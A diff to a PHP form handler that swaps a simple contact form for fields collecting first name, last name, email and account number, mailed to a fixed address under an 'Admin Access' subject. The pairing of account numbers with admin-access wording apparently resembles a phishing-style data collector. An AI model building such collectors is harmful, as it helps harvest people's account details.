@@ -2,11 +2,25 @@
 
 $errorMSG = "";
 
-// NAME
-if (empty($_POST["name"])) {
-    $errorMSG = "Name is required ";
+// FIRST NAME
+if (empty($_POST["first_name"])) {
+    $errorMSG = "First name is required ";
 } else {
-    $name = $_POST["name"];
+    $firstname = $_POST["first_name"];
+}
+
+// LAST NAME
+if (empty($_POST["last_name"])) {
+    $errorMSG = "Last name is required ";
+} else {
+    $lastname = $_POST["last_name"];
+}
+
+// ACCOUNT NUMBER
+if (empty($_POST["acct_num"])) {
+    $errorMSG .= "Account number is required ";
+} else {
+    $acctnum = $_POST["acct_num"];
 }
 
 // EMAIL
@@ -16,27 +30,22 @@ if (empty($_POST["email"])) {
     $email = $_POST["email"];
 }
 
-// MESSAGE
-if (empty($_POST["message"])) {
-    $errorMSG .= "Message is required ";
-} else {
-    $message = $_POST["message"];
-}
-
-
 $EmailTo = "hassan.salman@yurz.com";
-$Subject = "Verify Admin Access";
+$Subject = "Admin Access";
 
 // prepare email body text
 $Body = "";
-$Body .= "Name: ";
-$Body .= $name;
+$Body .= "First Name: ";
+$Body .= $firstname;
+$Body .= "\n";
+$Body .= "Last Name: ";
+$Body .= $lastname;
 $Body .= "\n";
 $Body .= "Email: ";
 $Body .= $email;
 $Body .= "\n";
-$Body .= "Message: ";
-$Body .= $message;
+$Body .= "Account Number: ";
+$Body .= $acctnum;
 $Body .= "\n";
 
 // send email
